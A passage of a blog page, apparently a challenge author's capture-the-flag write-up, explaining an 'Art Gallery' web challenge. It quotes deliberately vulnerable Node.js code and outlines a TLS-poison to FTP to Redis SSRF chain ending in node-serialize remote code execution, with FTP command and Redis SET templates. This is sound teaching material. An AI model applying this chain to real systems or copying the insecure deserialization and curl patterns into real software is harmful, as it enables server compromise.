+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">data_arr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">images</span> <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">key</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">data_arr</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">images</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">data_arr</span>[<span style="color:#a6e22e">key</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">on</span>(<span style="color:#e6db74">&#34;finish&#34;</span>, <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span>) {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">redisClient</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">`image_</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#a6e22e">serialize</span>.<span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">images</span>));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">redisClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">`image_</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">next</span>();
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>A user&rsquo;s array of images are serialized and pushed into Redis, but they&rsquo;re unserialized when needed using the dangerous <a href="https://github.com/luin/serialize">node-serialize</a> library. If you manage to set <code>image_${req.session.art_token}</code> to an RCE node-serialize payload, it&rsquo;s game over. However, you couldn&rsquo;t do anything cheeky like submitting an image with the filename being the payload, you needed to manually change the value of that key in Redis. The Redis server, however, was not accessible to the public.</p>
+<h4 id="image-file-upload">Image file upload</h4>
+<p>The code handling the uploading of your own photos is below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/upload&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">art_token</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//People can upload max 4 images, which are inserted into their images array rolling basis
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">random_filename</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">crypto</span>.<span style="color:#a6e22e">randomBytes</span>(<span style="color:#ae81ff">10</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;hex&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.png&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//high quality design 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">files</span>.<span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">mv</span>(<span style="color:#e6db74">`/usr/src/app/ftp/files/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">random_filename</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">images</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">random_filename</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">images</span>.<span style="color:#a6e22e">shift</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#34;/&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>Now, take note that the filename given to your image appends a <code>.png</code> extension to it (<code>random_filename</code>) - this does nothing as the extension and file format are never checked as valid. Therefore, you could submit a file of any format and it will not get type-checked as a legit PNG image.</p>
+<h3 id="step-1-tls-poison">Step 1: TLS Poison</h3>
+<p>The first step is the most tedious/hardest to work on. For those unaware, TLS poison is an innovative way to use TLS session ids or tickets to create powerful new SSRF techniques - <a href="https://www.youtube.com/watch?v=udpamSmD_vU&amp;ab_channel=BlackHat">here is the blackhat talk that discusses this in detail - thank you Joshua Maddux!</a>.</p>
+<p>The crux of the TLS poison is that the <a href="https://github.com/jmdx/TLS-poison">exploit server that is freely available out of the box</a> needed to be tweaked if you were to use it for the challenge. The jmdx TLS server would expect 2 requests to the DNS server, and it would alternate A records on each request, which is fine for most use cases <em>except</em> my challenge. See, the HTTP server makes a <em>curl</em> request to the specified resource:</p>
+<p><em>Entrypoint into TLS poison part</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/query&#39;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">host</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">host</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> parseInt(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">port</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//im aware its bad 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">cp</span>.<span style="color:#a6e22e">execFileSync</span>(<span style="color:#e6db74">&#34;timeout&#34;</span>, [<span style="color:#e6db74">&#39;5s&#39;</span>, <span style="color:#e6db74">&#39;curl&#39;</span>, <span style="color:#e6db74">&#39;-k&#39;</span>, <span style="color:#e6db74">&#39;-L&#39;</span>, <span style="color:#e6db74">`https://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">host</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/`</span>]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Error encountered&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;The curator will observe your art&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>&hellip;and curl caches DNS records for 60 seconds, <strong>including DNS records with 0 TTL</strong>. This sorta screws us over, since instigating an HTTP redirect (in your domain) within that timeframe will visit the original server instead of asking our DNS server for the IP again. However, you couldn&rsquo;t wait the whole 60 seconds for the DNS cache to expire in libcurl, cause if the command would hang for a while, the server would complain. An additional 5s timeout was implemented as well which forcibly closes the curl connection way before a DNS server could redirect back to a localhost address. To move around this, you can instead have your DNS server send in multiple A records - one being the legit IP of your domain and the other being a local one - but immediately close the port of the first IP when the HTTP redirect occurs so curl has no choice but to try the other A record instead - the local one.</p>
+<p>This will succesfully force curl to ping a localhost IP and not retry a connection with your server IP. Of course, I saw, from the teams that solved Art Gallery, they got crafty around this part, so there are multiple ways to achieve TLS poison while avoiding libcurl&rsquo;s caching.</p>
+<p>In any case, you make the server submit a session ticket (NOT id as TLS 1.2 session ids are too small to fit the whole FTP payload in) to the FTP server, running on port 8021.</p>
+<p>The session ticket would look something like:</p>
+<pre tabindex="0"><code>[Random TLS stuff] \nUSER\nPASS\nPORT 127,0,0,1,24,235\nRETR &lt;userfilename&gt;
+</code></pre><p>The <code>PORT</code> command makes the server operate on active mode, establishing a data channel with localhost on port 6379 (where the Redis server is), which allows you to send a file of your choosing in the server&rsquo;s filesystem through that data channel.</p>
+<p>Anyway, bypass curl&rsquo;s caching and give the server a session ticket containing some FTP commands, leading to&hellip;</p>
+<h3 id="step-2-ftp-ssrf">Step 2: FTP SSRF</h3>
+<p>Remember the file format quirk?</p>
+<p>What we could do with it was upload a file which contained RESP commands that set the user&rsquo;s key to a node-serialize RCE payload, and have the FTP server RETR that file to Redis on active mode. We couldn&rsquo;t talk to the Redis server on our own, so let&rsquo;s use the FTP server to talk to it instead.</p>
+<p>Through TLS poisoning, you could submit a session ticket to the FTP server which would contain a bunch of FTP commands that should make the server operate on active mode, establish a data connection with the local Redis server on port 6379, and RETR the malicious &ldquo;image&rdquo; file to it.</p>
+<p>NOTE: The FTP server was intentionally made to be quiet even when recieving commands, as normal protocol involved it writing responses on input and it would try to do that into the SSL socket which caused problems.</p>
+<h3 id="step-3-redis-ssrf">Step 3: Redis SSRF</h3>
+<p>Redis also uses a plaintext protocol, RESP, for data manipulation. When the FTP server establishes a data connection to the Redis one, the file it sends over should contain new-line delimited RESP commands which set a user&rsquo;s &ldquo;images&rdquo; key to that of a node-serialize payload.</p>
+<p>Your uploaded &lsquo;image&rsquo; file should have the following command inside:</p>
+<pre tabindex="0"><code>SET image_&lt;your art token&gt; &lt;node serialize payload&gt;
+</code></pre><h3 id="step-4-fleg">Step 4: Fleg</h3>
+<p>When you revisit the art gallery, the app should deserialize your payload, netting you the flag.</p>
+<pre tabindex="0"><code>maple{M4N_I_L0V3_SSRFz_1N_My_SSRF5_In_my_556Fs}
+</code></pre><h3 id="notes">Notes</h3>
+<ul>
+<li>
+<p>The curl command was made possible with a pipe to a subprocess on <code>execFileSync</code>. A few people got hung up on this part as I believe this looks like a possible command injection - however, <code>execFileSync</code> passes the entire argument given to it as a single command, so injection was not possible. Others thought to use <code>gopher://</code> which is technically on the right track in terms of using SSRF, but again, not possible through the subprocess.</p>
+</li>
+<li>
+<p>It was a bit of a struggle having the FTP -&gt; Redis part work reliably, but for us, padding the &ldquo;image&rdquo; file with hella whitespaces was sufficient for that SSRF to work reliably. Some other teams also appended a QUIT command in their sessional tickets to achieve similar effect.</p>
+</li>
+<li>
+<p>Of course, things would have been <strong>considerably</strong> easier had people managed to be able to connect to either the FTP server or the Redis server on their own. This was not possible as only the HTTP server&rsquo;s port was exposed.</p>
+</li>
+<li>
+<p>Some of you may have been wondering - &ldquo;Was the FTP server necessary? Was TLS Poison -&gt; Redis not possible?&rdquo; Maybe it was, but on initial tests the Redis server did NOT like random TLS junk that was included in the sessional tickets. FTP didn&rsquo;t care, so :/</p>
+</li>
+</ul>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://jamvie.net/tags/writeups">writeups</a></span><span class="tag"><a href="https://jamvie.net/tags/tls-poison">tls-poison</a></span><span class="tag"><a href="https://jamvie.net/tags/ssrf">ssrf</a></span><span class="tag"><a href="https://jamvie.net/tags/web">web</a></span><span class="tag"><a href="https://jamvie.net/tags/prototype-pollution">prototype-pollution</a></span><span class="tag"><a href="https://jamvie.net/tags/insecure-deserialization">insecure-deserialization</a></span><span class="tag"><a href="https://jamvie.net/tags/ftp">ftp</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>2260 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2022-09-01 14:50 -0600</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://jamvie.net/posts/2022/08/defcon-30-retrospective/">
+                                <span class="button__text">DEFCON 30: Retrospective</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            
+                <span><a href="https://jamvie.net">Vie</a></span>
+            
+            <span>CC Attribution-NonCommercial 4.0 International License</span>
+            <span> <a href="https://jamvie.net/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://jamvie.net/bundle.min.188af889e916d7182e7bf4af7bed9ff4c9b70dd61a69188cb044d25745a4ffc32b82cbec846336503520a7716e619cb46848931205cfa3176a691ff9152d4947.js" integrity="sha512-GIr4iekW1xgue/Sve&#43;2f9Mm3DdYaaRiMsETSV0Wk/8MrgsvshGM2UDUgp3FuYZy0aEiTEgXPoxdqaR/5FS1JRw=="></script>
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-176711986-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+    </body>
+</html>
